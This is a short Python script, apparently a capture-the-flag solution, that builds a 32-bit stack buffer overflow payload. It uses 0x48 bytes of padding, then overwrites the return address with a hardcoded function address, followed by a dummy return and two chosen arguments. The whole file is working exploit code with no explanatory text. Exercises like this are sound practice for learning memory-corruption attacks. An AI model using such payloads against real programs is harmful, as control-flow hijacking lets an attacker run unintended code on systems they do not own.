#!/usr/bin/env python

import struct

def p32(num):
	return struct.pack("<I", num)

offset = 0x48
first_param = 0x12345678
second_param = 0xabcdef01
secret_param_func_address = 0x08048496

payload = offset * "A"  + p32(secret_param_func_address) + 4 * "B" + p32(first_param) + p32(second_param)
print(payload)
